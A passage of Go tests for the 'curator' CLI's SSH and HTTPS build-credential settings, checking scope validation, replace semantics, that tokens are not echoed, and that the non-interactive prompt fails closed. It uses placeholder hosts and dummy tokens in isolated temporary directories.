		t.Fatal(err)
	}
	contextPath := filepath.Join(t.TempDir(), "context.json")
	contextBytes, err := json.Marshal(map[string]any{
		"commit":           strings.Repeat("1", 40),
		"declared_url":     "https://example.invalid/oracle-fixture",
		"include":          []any{},
		"manifest_tracked": true,
		"package": map[string]any{
			"name": "oracle_fixture", "source": "git+https://example.invalid/oracle-fixture#" + strings.Repeat("1", 40), "version": "0.1.0",
		},
		"package_path":  "",
		"schema_id":     "rust-git-oracle-context-v1",
		"selector":      "rev=" + strings.Repeat("1", 40),
		"submodules":    []any{},
		"tracked_paths": []any{"Cargo.toml", "src/lib.rs"},
		"tree":          "sha256:" + strings.Repeat("2", 64),
	})
	if err != nil {
		t.Fatal(err)
	}
	if err = os.WriteFile(contextPath, contextBytes, 0o600); err != nil {
		t.Fatal(err)
	}

	fakeBin := t.TempDir()
	rustupMarker := filepath.Join(t.TempDir(), "rustup-started")
	fakeRustup := filepath.Join(fakeBin, "rustup")
	if err = os.WriteFile(fakeRustup, []byte("#!/bin/sh\nprintf started > \"$RUSTUP_MARKER\"\nexit 97\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	outputRoot := t.TempDir()
	command := exec.Command(binary, "__curator_rust_git_oracle_v1")
	command.Env = []string{
		"CURATOR_OUTPUT_ROOT=" + outputRoot,
		"LANG=C", "LC_ALL=C",
		"PATH=" + fakeBin,
		"RUSTUP_MARKER=" + rustupMarker,
		"RUST_GIT_CONTEXT=" + contextPath,
		"RUST_GIT_SOURCE=" + source,
		"TZ=UTC",
	}
	if output, runErr := command.CombinedOutput(); runErr != nil {
		t.Fatalf("production Rust oracle: %v\n%s", runErr, output)
	}
	if _, statErr := os.Stat(rustupMarker); !os.IsNotExist(statErr) {
		t.Fatalf("ambient rustup started before or inside the oracle: %v", statErr)
	}
	projection, err := os.ReadFile(filepath.Join(outputRoot, "rust-git-projection-v1.json"))
	if err != nil {
		t.Fatal(err)
	}
	var decoded map[string]any
	if err = json.Unmarshal(projection, &decoded); err != nil {
		t.Fatal(err)
	}
	if decoded["schema_id"] != "rust-git-projection-v1" || decoded["normalizer_id"] != rustsource.NormalizerID {
		t.Fatalf("production oracle projection identity = %#v", decoded)
	}
}

// bootstrapConfig points the CLI at a private config file and creates it.
func bootstrapConfig(t *testing.T) string {
	t.Helper()
	configPath := filepath.Join(t.TempDir(), "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	if code := run([]string{"bootstrap", "--non-interactive", "--skills-root", t.TempDir()}); code != exitOK {
		t.Fatalf("bootstrap = %d", code)
	}
	return configPath
}

// captureStdout collects what a command prints, so a test can assert on the
// listing itself rather than only on its exit code.
func captureStdout(t *testing.T, body func()) string {
	t.Helper()
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	saved := os.Stdout
	os.Stdout = writer
	defer func() { os.Stdout = saved }()
	body()
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	output, err := io.ReadAll(reader)
	if err != nil {
		t.Fatal(err)
	}
	return string(output)
}

// withStdin feeds content to a command reading from os.Stdin, standing in for
// a scripted, non-terminal invocation: an os.Pipe reader is never a terminal,
// which is exactly the "stdin when not a terminal" path build-https login
// documents.
func withStdin(t *testing.T, content string, body func()) {
	t.Helper()
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	if _, err := writer.WriteString(content); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	saved := os.Stdin
	os.Stdin = reader
	defer func() { os.Stdin = saved }()
	body()
}

// buildHTTPSGitHome isolates a Git credential store under an operator home
// this process's HOME/USERPROFILE resolve to, so a build-https login test
// exercises the same gitcred.Access{} zero value the command itself uses,
// without ever touching whatever the real operator has configured.
func buildHTTPSGitHome(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git is not available")
	}
	home := t.TempDir()
	if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte("[credential]\n\thelper = store\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	return home
}

func TestConfigBuildSSHAddListRemove(t *testing.T) {
	configPath := bootstrapConfig(t)

	for _, args := range [][]string{
		{"config", "build-ssh", "add", "zeta.example.com", "--agent"},
		{"config", "build-ssh", "add", "git.example.com/portals", "--agent", "/run/portals.sock",
			"--identity", "~/.ssh/portals", "--known-hosts", "/etc/ssh/known_hosts_portals"},
		{"config", "build-ssh", "add", "git.example.com", "--identity", "/keys/org"},
	} {
		if code := run(args); code != exitOK {
			t.Fatalf("%v = %d, want %d", args, code, exitOK)
		}
	}

	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := config.BuildSSHCredential{
		Scope: "git.example.com/portals", Agent: true, AgentSocket: "/run/portals.sock",
		Identity: "~/.ssh/portals", KnownHosts: "/etc/ssh/known_hosts_portals",
	}
	if got := cfg.BuildSSH["git.example.com/portals"]; got != want {
		t.Fatalf("credential = %+v, want %+v", got, want)
	}

	// A second add under the same scope replaces the entry rather than
	// merging with it: the leftover agent selection would still authenticate.
	replaceOutput := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "add", "zeta.example.com", "--identity", "/keys/zeta"}); code != exitOK {
			t.Fatalf("replace add = %d", code)
		}
	})
	if !strings.HasPrefix(replaceOutput, "replaced build_ssh scope zeta.example.com: identity=/keys/zeta") {
		t.Fatalf("replace output = %q", replaceOutput)
	}
	cfg, err = config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if replaced := cfg.BuildSSH["zeta.example.com"]; replaced.Agent || replaced.Identity != "/keys/zeta" {
		t.Fatalf("replaced credential = %+v", replaced)
	}

	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "list"}); code != exitOK {
			t.Fatalf("list = %d", code)
		}
	})
	wantListing := "git.example.com\tidentity=/keys/org\n" +
		"git.example.com/portals\tagent=/run/portals.sock identity=~/.ssh/portals known_hosts=/etc/ssh/known_hosts_portals\n" +
		"zeta.example.com\tidentity=/keys/zeta\n"
	if listing != wantListing {
		t.Fatalf("listing =\n%q\nwant\n%q", listing, wantListing)
	}

	if code := run([]string{"config", "build-ssh", "remove", "git.example.com/portals"}); code != exitOK {
		t.Fatalf("remove = %d", code)
	}
	cfg, err = config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, present := cfg.BuildSSH["git.example.com/portals"]; present {
		t.Fatalf("removed scope still configured: %+v", cfg.BuildSSH)
	}
	if len(cfg.BuildSSH) != 2 {
		t.Fatalf("remove disturbed other scopes: %+v", cfg.BuildSSH)
	}
}

func TestConfigBuildSSHListWithoutScopesPrintsNothing(t *testing.T) {
	bootstrapConfig(t)
	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "list"}); code != exitOK {
			t.Fatalf("empty list = %d", code)
		}
	})
	if listing != "" {
		t.Fatalf("empty listing = %q, want no stdout", listing)
	}
}

func TestConfigBuildSSHAddRejectsInvalidInvocations(t *testing.T) {
	configPath := bootstrapConfig(t)
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	for name, args := range map[string][]string{
		"no scope":            {"config", "build-ssh", "add", "--agent"},
		"two scopes":          {"config", "build-ssh", "add", "a.example.com", "b.example.com", "--agent"},
		"uppercase host":      {"config", "build-ssh", "add", "Git.Example.com", "--agent"},
		"dot segment":         {"config", "build-ssh", "add", "git.example.com/../etc", "--agent"},
		"empty segment":       {"config", "build-ssh", "add", "git.example.com//portals", "--agent"},
		"scheme in scope":     {"config", "build-ssh", "add", "ssh://git.example.com", "--agent"},
		"selects nothing":     {"config", "build-ssh", "add", "git.example.com"},
		"known hosts only":    {"config", "build-ssh", "add", "git.example.com", "--known-hosts", "/etc/kh"},
		"relative identity":   {"config", "build-ssh", "add", "git.example.com", "--identity", "keys/org"},
		"relative socket":     {"config", "build-ssh", "add", "git.example.com", "--agent=run/agent.sock"},
		"relative known host": {"config", "build-ssh", "add", "git.example.com", "--identity", "/keys/org", "--known-hosts", "kh"},
		"negated agent":       {"config", "build-ssh", "add", "git.example.com", "--agent=false"},
		"unknown flag":        {"config", "build-ssh", "add", "git.example.com", "--agent", "--pin", "x"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%s: %v = %d, want %d", name, args, code, exitUsage)
		}
	}
	after, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(after) != string(before) {
		t.Fatalf("a rejected add rewrote the config:\n%s", after)
	}
}

func TestConfigBuildSSHAgentFlagKeepsScopePositional(t *testing.T) {
	configPath := bootstrapConfig(t)
	if code := run([]string{"config", "build-ssh", "add", "--agent", "alpha.example.com"}); code != exitOK {
		t.Fatalf("bare --agent before the scope = %d", code)
	}
	if code := run([]string{"config", "build-ssh", "add", "beta.example.com", "--agent", "/run/beta.sock"}); code != exitOK {
		t.Fatalf("--agent with a socket = %d", code)
	}
	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	alpha := cfg.BuildSSH["alpha.example.com"]
	if !alpha.Agent || alpha.AgentSocket != "" {
		t.Fatalf("alpha credential = %+v", alpha)
	}
	beta := cfg.BuildSSH["beta.example.com"]
	if !beta.Agent || beta.AgentSocket != "/run/beta.sock" {
		t.Fatalf("beta credential = %+v", beta)
	}
}

func TestConfigBuildSSHRemoveRejectsMissingAndMalformedTargets(t *testing.T) {
	bootstrapConfig(t)
	if code := run([]string{"config", "build-ssh", "add", "git.example.com", "--agent"}); code != exitOK {
		t.Fatalf("add = %d", code)
	}
	if code := run([]string{"config", "build-ssh", "remove", "other.example.com"}); code != exitFail {
		t.Fatalf("remove of an unconfigured scope = %d, want %d", code, exitFail)
	}
	for _, args := range [][]string{
		{"config", "build-ssh", "remove"},
		{"config", "build-ssh", "remove", "a.example.com", "b.example.com"},
		{"config", "build-ssh", "remove", "--agent"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%v = %d, want %d", args, code, exitUsage)
		}
	}
}

func TestConfigBuildHTTPSAddListRemove(t *testing.T) {
	configPath := bootstrapConfig(t)

	for _, args := range [][]string{
		{"config", "build-https", "add", "zeta.example.com", "--git-credentials"},
		{"config", "build-https", "add", "git.example.com/portals", "--token-env", "PORTALS_TOKEN", "--username", "oauth2"},
		{"config", "build-https", "add", "git.example.com", "--keyring"},
	} {
		if code := run(args); code != exitOK {
			t.Fatalf("%v = %d, want %d", args, code, exitOK)
		}
	}

	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := config.BuildHTTPSCredential{
		Scope: "git.example.com/portals", TokenEnv: "PORTALS_TOKEN", Username: "oauth2",
	}
	if got := cfg.BuildHTTPS["git.example.com/portals"]; got != want {
		t.Fatalf("credential = %+v, want %+v", got, want)
	}

	// A second add under the same scope replaces the entry rather than
	// merging with it: a leftover username from the previous spelling would
	// still be sent alongside the new token.
	replaceOutput := captureStdout(t, func() {
		if code := run([]string{"config", "build-https", "add", "zeta.example.com", "--token-env", "ZETA_TOKEN"}); code != exitOK {
			t.Fatalf("replace add = %d", code)
		}
	})
	if !strings.HasPrefix(replaceOutput, "replaced build_https scope zeta.example.com: token_env=ZETA_TOKEN") {
		t.Fatalf("replace output = %q", replaceOutput)
	}
	cfg, err = config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if replaced := cfg.BuildHTTPS["zeta.example.com"]; replaced.Token != "" || replaced.TokenEnv != "ZETA_TOKEN" {
		t.Fatalf("replaced credential = %+v", replaced)
	}

	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-https", "list"}); code != exitOK {
			t.Fatalf("list = %d", code)
		}
	})
	wantListing := "git.example.com\tsource=keyring present=false\n" +
		"git.example.com/portals\ttoken_env=PORTALS_TOKEN username=oauth2 present=false\n" +
		"zeta.example.com\ttoken_env=ZETA_TOKEN present=false\n"
	if listing != wantListing {
		t.Fatalf("listing =\n%q\nwant\n%q", listing, wantListing)
	}

	if code := run([]string{"config", "build-https", "remove", "git.example.com/portals"}); code != exitOK {
		t.Fatalf("remove = %d", code)
	}
	cfg, err = config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, present := cfg.BuildHTTPS["git.example.com/portals"]; present {
		t.Fatalf("removed scope still configured: %+v", cfg.BuildHTTPS)
	}
	if len(cfg.BuildHTTPS) != 2 {
		t.Fatalf("remove disturbed other scopes: %+v", cfg.BuildHTTPS)
	}
}

func TestConfigBuildHTTPSListWithoutScopesPrintsNothing(t *testing.T) {
	bootstrapConfig(t)
	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-https", "list"}); code != exitOK {
			t.Fatalf("empty list = %d", code)
		}
	})
	if listing != "" {
		t.Fatalf("empty listing = %q, want no stdout", listing)
	}
}

func TestConfigBuildHTTPSAddRejectsInvalidInvocations(t *testing.T) {
	configPath := bootstrapConfig(t)
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	for name, args := range map[string][]string{
		"no scope":          {"config", "build-https", "add", "--git-credentials"},
		"two scopes":        {"config", "build-https", "add", "a.example.com", "b.example.com", "--git-credentials"},
		"uppercase host":    {"config", "build-https", "add", "Git.Example.com", "--git-credentials"},
		"no source":         {"config", "build-https", "add", "git.example.com"},
		"two sources":       {"config", "build-https", "add", "git.example.com", "--git-credentials", "--keyring"},
		"source and env":    {"config", "build-https", "add", "git.example.com", "--git-credentials", "--token-env", "X"},
		"invalid token_env": {"config", "build-https", "add", "git.example.com", "--token-env", "1_TOKEN"},
		"unknown flag":      {"config", "build-https", "add", "git.example.com", "--git-credentials", "--pin", "x"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%s: %v = %d, want %d", name, args, code, exitUsage)
		}
	}
	after, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(after) != string(before) {
		t.Fatalf("a rejected add rewrote the config:\n%s", after)
	}
}

func TestConfigBuildHTTPSRemoveRejectsMissingAndMalformedTargets(t *testing.T) {
	bootstrapConfig(t)
	if code := run([]string{"config", "build-https", "add", "git.example.com", "--git-credentials"}); code != exitOK {
		t.Fatalf("add = %d", code)
	}
	if code := run([]string{"config", "build-https", "remove", "other.example.com"}); code != exitFail {
		t.Fatalf("remove of an unconfigured scope = %d, want %d", code, exitFail)
	}
	for _, args := range [][]string{
		{"config", "build-https", "remove"},
		{"config", "build-https", "remove", "a.example.com", "b.example.com"},
		{"config", "build-https", "remove", "--git-credentials"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%v = %d, want %d", args, code, exitUsage)
		}
	}
}

func TestConfigBuildHTTPSLoginRejectsInvalidInvocations(t *testing.T) {
	bootstrapConfig(t)
	for name, args := range map[string][]string{
		"no scope":       {"config", "build-https", "login"},
		"two scopes":     {"config", "build-https", "login", "a.example.com", "b.example.com"},
		"uppercase host": {"config", "build-https", "login", "Git.Example.com"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%s: %v = %d, want %d", name, args, code, exitUsage)
		}
	}
}

// TestConfigBuildHTTPSLoginStoresThroughTheOperatorHelperAndSelectsIt exercises
// the whole round trip against a real, isolated Git credential store: login
// reads the token from stdin rather than a terminal (the same "no terminal"
// path a scripted invocation takes), stores it, and selects it; list then
// reports it present; remove drops both the scope and the stored token.
func TestConfigBuildHTTPSLoginStoresThroughTheOperatorHelperAndSelectsIt(t *testing.T) {
	buildHTTPSGitHome(t)
	configPath := bootstrapConfig(t)

	loginOutput := captureStdout(t, func() {
		withStdin(t, "s3cr3t-token\n", func() {
			if code := run([]string{
				"config", "build-https", "login", "git.example.com/portals", "--username", "oauth2",
			}); code != exitOK {
				t.Fatalf("login = %d", code)
			}
		})
	})
	if !strings.Contains(loginOutput, "build_https scope git.example.com/portals") {
		t.Fatalf("login output = %q", loginOutput)
	}
	if strings.Contains(loginOutput, "s3cr3t-token") {
		t.Fatalf("login output leaked the token: %q", loginOutput)
	}

	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := config.BuildHTTPSCredential{
		Scope: "git.example.com/portals", Token: config.TokenSourceKeyring, Username: "oauth2",
	}
	if got := cfg.BuildHTTPS["git.example.com/portals"]; got != want {
		t.Fatalf("credential = %+v, want %+v", got, want)
	}

	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-https", "list"}); code != exitOK {
			t.Fatalf("list = %d", code)
		}
	})
	if !strings.Contains(listing, "git.example.com/portals\tsource=keyring username=oauth2 present=true\n") {
		t.Fatalf("listing = %q, want the stored token reported present", listing)
	}

	// A second login for the same scope replaces the stored token rather than
	// leaving the old one behind under it.
	replaceOutput := captureStdout(t, func() {
		withStdin(t, "second-token\n", func() {
			if code := run([]string{"config", "build-https", "login", "git.example.com/portals"}); code != exitOK {
				t.Fatalf("second login = %d", code)
			}
		})
	})
	if !strings.HasPrefix(replaceOutput, "replaced the login for build_https scope git.example.com/portals") {
		t.Fatalf("replace login output = %q", replaceOutput)
	}
	access := gitcred.Access{}
	if secret, ok := access.ReadScoped(context.Background(), "git.example.com/portals", "git.example.com"); !ok || secret != "second-token" {
		t.Fatalf("stored secret = %q, %v; want the replacement token", secret, ok)
	}

	if code := run([]string{"config", "build-https", "remove", "git.example.com/portals"}); code != exitOK {
		t.Fatalf("remove = %d", code)
	}
	cfg, err = config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, present := cfg.BuildHTTPS["git.example.com/portals"]; present {
		t.Fatalf("removed scope still configured: %+v", cfg.BuildHTTPS)
	}
	if _, ok := access.ReadScoped(context.Background(), "git.example.com/portals", "git.example.com"); ok {
		t.Fatal("remove left the stored token behind")
	}
}

// TestConfigBuildHTTPSRemoveNeverTouchesTheOperatorsOwnGitCredential pins that
// remove only ever deletes a manager-namespaced entry: a git-credentials
// scope selects the operator's own credential, which is not the manager's to
// delete.
func TestConfigBuildHTTPSRemoveNeverTouchesTheOperatorsOwnGitCredential(t *testing.T) {
	home := buildHTTPSGitHome(t)
	bootstrapConfig(t)
	// The operator's own credential, recorded exactly the way `git credential
	// approve` (or an interactive Git login) would leave it, before the
	// manager stores anything of its own.
	credentials := filepath.Join(home, ".git-credentials")
	if err := os.WriteFile(credentials, []byte("https://operator:operator-secret@git.example.com\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if code := run([]string{"config", "build-https", "add", "git.example.com", "--git-credentials"}); code != exitOK {
		t.Fatalf("add = %d", code)
	}
	if code := run([]string{"config", "build-https", "remove", "git.example.com"}); code != exitOK {
		t.Fatalf("remove = %d", code)
	}
	access := gitcred.Access{}
	own, ok := access.ReadHost(context.Background(), "git.example.com")
	if !ok || own.Username != "operator" || own.Secret != "operator-secret" {
		t.Fatalf("remove disturbed the operator's own credential: %+v, %v", own, ok)
	}
}

func TestConfigHelpDocumentsPrecedenceAndSubcommands(t *testing.T) {
	for _, fragment := range []string{
		"curator config build-ssh add <scope>",
		"curator config build-ssh list",
		"curator config build-ssh remove <scope>",
		"--known-hosts PATH",
		"CURATOR_BUILD_SSH_*",
	} {
		if !strings.Contains(buildSSHUsage, fragment) {
			t.Fatalf("build-ssh help does not document %q", fragment)
		}
	}
	// Precedence is the operator's only defence against a stale config scope
	// silently outranking the flag they just typed.
	flags := strings.Index(buildSSHUsage, "flags override")
	environment := strings.Index(buildSSHUsage, "CURATOR_BUILD_SSH_*")
	scopes := strings.Index(buildSSHUsage, "override the scopes configured here")
	if flags < 0 || flags >= environment || environment >= scopes {
		t.Fatalf("help must order precedence flags > env > config scopes: %d %d %d", flags, environment, scopes)
	}
	if !strings.Contains(configUsage, "build-ssh") || !strings.Contains(configUsage, "curator config show") {
		t.Fatalf("config help does not enumerate its subcommands: %q", configUsage)
	}
	if !strings.Contains(configUsage, "build-https") {
		t.Fatalf("config help does not enumerate build-https: %q", configUsage)
	}
}

// TestConfigBuildHTTPSHelpDocumentsPrecedenceAndDisclosure covers what
// build-ssh's help does not need to: build-https has no CLI flag carrying a
// literal token, so its precedence is entirely env-vs-config, and core 12.2
// requires the identity-unbound run-wide override to come with an explicit
// exposure warning.
func TestConfigBuildHTTPSHelpDocumentsPrecedenceAndDisclosure(t *testing.T) {
	for _, fragment := range []string{
		"curator config build-https add <scope>",
		"curator config build-https login <scope>",
		"curator config build-https list",
		"curator config build-https remove <scope>",
		"--git-credentials",
		"--keyring",
		"--token-env NAME",
		"CURATOR_BUILD_HTTPS_TOKEN",
		"CURATOR_BUILD_HTTPS_HOST",
		"12.2",
	} {
		if !strings.Contains(buildHTTPSUsage, fragment) {
			t.Fatalf("build-https help does not document %q", fragment)
		}
	}
	// A token is never a command-line argument: the help must say so, not
	// just the code.
	if !strings.Contains(buildHTTPSUsage, "never accepted as a command-line argument") {
		t.Fatal("build-https help does not document that a token is never a CLI argument")
	}
	// Precedence: the run-wide override (optionally host-bound) ahead of the
	// configured scopes.
	override := strings.Index(buildHTTPSUsage, "CURATOR_BUILD_HTTPS_TOKEN")
	scopes := strings.Index(buildHTTPSUsage, "scopes configured here")
	if override < 0 || override >= scopes {
		t.Fatalf("help must order precedence override > config scopes: %d %d", override, scopes)
	}
	// The disclosure warning core 12.2 requires for an identity-unbound
	// selection.
	warning := strings.Index(buildHTTPSUsage, "Disclosure warning")
	if warning < 0 || warning < scopes {
		t.Fatalf("help must carry the 12.2 disclosure warning after the precedence rule: %d %d", warning, scopes)
	}
	if !strings.Contains(buildHTTPSUsage, "offered to every private HTTPS build repository host") {
		t.Fatal("build-https help does not spell out the exposure the warning is about")
	}
}

func TestConfigSubcommandDispatch(t *testing.T) {
	bootstrapConfig(t)
	for _, args := range [][]string{
		{"config", "-h"},
		{"config", "build-ssh", "-h"},
		{"config", "build-https", "-h"},
		{"config", "show"},
	} {
		if code := run(args); code != exitOK {
			t.Fatalf("%v = %d, want %d", args, code, exitOK)
		}
	}
	for _, args := range [][]string{
		{"config"},
		{"config", "frobnicate"},
		{"config", "build-ssh"},
		{"config", "build-ssh", "frobnicate"},
		{"config", "build-https"},
		{"config", "build-https", "frobnicate"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%v = %d, want %d", args, code, exitUsage)
		}
	}
}

// TestTheCredentialPromptIsWiredOnlyWhereAnOperatorCanAnswerIt proves the two
// conditions the interactive precheck depends on. A test process is not a
// terminal, so both cases here are the fail-closed one; the dry-run case is
// asserted separately because it must hold even in front of a real terminal.
func TestTheCredentialPromptIsWiredOnlyWhereAnOperatorCanAnswerIt(t *testing.T) {
	cfg := &config.Config{Path: filepath.Join(t.TempDir(), "config.json")}
	if resolver := operatorBuildSSHResolver(cfg, true); resolver != nil {
		t.Fatal("a dry run offered to persist a credential")
	}
	if resolver := operatorBuildHTTPSResolver(cfg, true); resolver != nil {
		t.Fatal("a dry run offered the HTTPS credential prompt")
	}
	if resolver := operatorBuildSSHResolver(cfg, false); resolver != nil {
		t.Fatal("a non-interactive process offered a prompt nobody can answer")
	}
	if resolver := operatorBuildHTTPSResolver(cfg, false); resolver != nil {
		t.Fatal("a non-interactive process offered an HTTPS prompt instead of continuing anonymously")
	}
	// `< /dev/null` is a character device. Treating that as a terminal would
	// make a scripted run block on a question instead of failing closed.
	devNull, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = devNull.Close() }()
	if attachedToTerminal(devNull) {
		t.Fatal(os.DevNull + " was reported as a terminal")
	}
	pipeRead, pipeWrite, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = pipeRead.Close(); _ = pipeWrite.Close() }()
	if attachedToTerminal(pipeRead) {
		t.Fatal("a pipe was reported as a terminal")
	}
}

// TestThePromptPersistsThroughTheOrdinaryConfigWriter proves the resolver
// wiring records exactly what `curator config build-ssh add` would, so a
// prompted answer and a typed command leave the same configuration behind.
func TestThePromptPersistsThroughTheOrdinaryConfigWriter(t *testing.T) {
	configPath := bootstrapConfig(t)
	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	transcript := &strings.Builder{}
	resolver := install.InteractiveBuildSSHResolver(strings.NewReader("\n\n"), transcript,
		func(credential config.BuildSSHCredential) error {
			_, setErr := config.SetBuildSSH(cfg.Path, credential)
			return setErr
		})
	added, err := resolver([]install.BuildSSHRequest{{
		Skill: "portals", Command: "build-tool",
		Identity:     "git.example.test/portals/app",
		DefaultScope: "git.example.test/portals",
	}}, install.BuildSSHCandidates{
		AgentSocket: "/run/agent.sock", AgentKeys: 1, AgentKeysKnown: true,
		Identities: []string{"~/.ssh/id_ed25519.pub"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(added) != 1 {
		t.Fatalf("resolver returned %+v", added)
	}
	reloaded, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := config.BuildSSHCredential{
		Scope: "git.example.test/portals", Agent: true, Identity: "~/.ssh/id_ed25519.pub",
	}
	if got := reloaded.BuildSSH["git.example.test/portals"]; got != want {
		t.Fatalf("persisted credential = %+v, want %+v", got, want)
	}
	// The same entry the CLI would have written, byte for byte in the listing.
	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "list"}); code != exitOK {
			t.Fatalf("list = %d", code)
		}
	})
	if listing != "git.example.test/portals\tagent identity=~/.ssh/id_ed25519.pub\n" {
		t.Fatalf("listing = %q", listing)
	}
}

func TestSSHThisRunOnlyPromptNeverReachesTheSavedConfig(t *testing.T) {
	configPath := bootstrapConfig(t)
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	resolver := install.InteractiveBuildSSHResolver(strings.NewReader("\nr\n"), &strings.Builder{},
		func(credential config.BuildSSHCredential) error {
			_, setErr := config.SetBuildSSH(configPath, credential)
			return setErr
		})
	added, err := resolver([]install.BuildSSHRequest{{
		Skill: "portals", Command: "build-tool", Identity: "git.example.test/portals/app",
		DefaultScope: "git.example.test/portals",
	}}, install.BuildSSHCandidates{AgentSocket: "/run/agent.sock", Identities: []string{"~/.ssh/id.pub"}})
	if err != nil || len(added) != 1 {
		t.Fatalf("run-only resolver = %+v, %v", added, err)
	}
	after, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(after, before) {
		t.Fatalf("this-run-only SSH answer changed config:\n%s", after)
	}
}

func TestHTTPSThisRunOnlyPromptNeverReachesConfigOrCredentialStore(t *testing.T) {
	home := buildHTTPSGitHome(t)
	configPath := bootstrapConfig(t)
	credentialsPath := filepath.Join(home, ".git-credentials")
	if err := os.WriteFile(credentialsPath, []byte("https://operator:operator-secret@git.example.test\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	beforeConfig, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	beforeCredentials, err := os.ReadFile(credentialsPath)
	if err != nil {
		t.Fatal(err)
	}
	access := gitcred.Access{}
	request := []install.BuildHTTPSRequest{{
		Skill: "portals", Command: "build-tool", Identity: "git.example.test/portals/app",
		Host: "git.example.test", DefaultScope: "git.example.test/portals",
	}}
	candidates := map[string]gitcred.HostMaterial{
		"git.example.test": access.Discover(context.Background(), "git.example.test", nil),
	}
	for name, testCase := range map[string]struct {
		script, token string
	}{
		"existing credential": {script: "\nr\n"},
		"entered token":       {script: "t\nr\n", token: "run-only-token"},
	} {
		t.Run(name, func(t *testing.T) {
			resolver := install.InteractiveBuildHTTPSResolver(strings.NewReader(testCase.script), &strings.Builder{},
				func() (string, error) { return testCase.token, nil }, persistPromptedBuildHTTPS(cfg, access))
			added, resolveErr := resolver(context.Background(), request, candidates, access)
			if resolveErr != nil || len(added) != 1 {
				t.Fatalf("run-only resolver = %+v, %v", added, resolveErr)
			}
			afterConfig, readErr := os.ReadFile(configPath)
			if readErr != nil {
				t.Fatal(readErr)
			}
			if !bytes.Equal(afterConfig, beforeConfig) {
				t.Fatalf("this-run-only HTTPS answer changed config:\n%s", afterConfig)
			}
			afterCredentials, readErr := os.ReadFile(credentialsPath)
			if readErr != nil {
				t.Fatal(readErr)
			}
			if !bytes.Equal(afterCredentials, beforeCredentials) {
				t.Fatalf("this-run-only HTTPS answer changed credential store:\n%s", afterCredentials)
			}
		})
	}
}
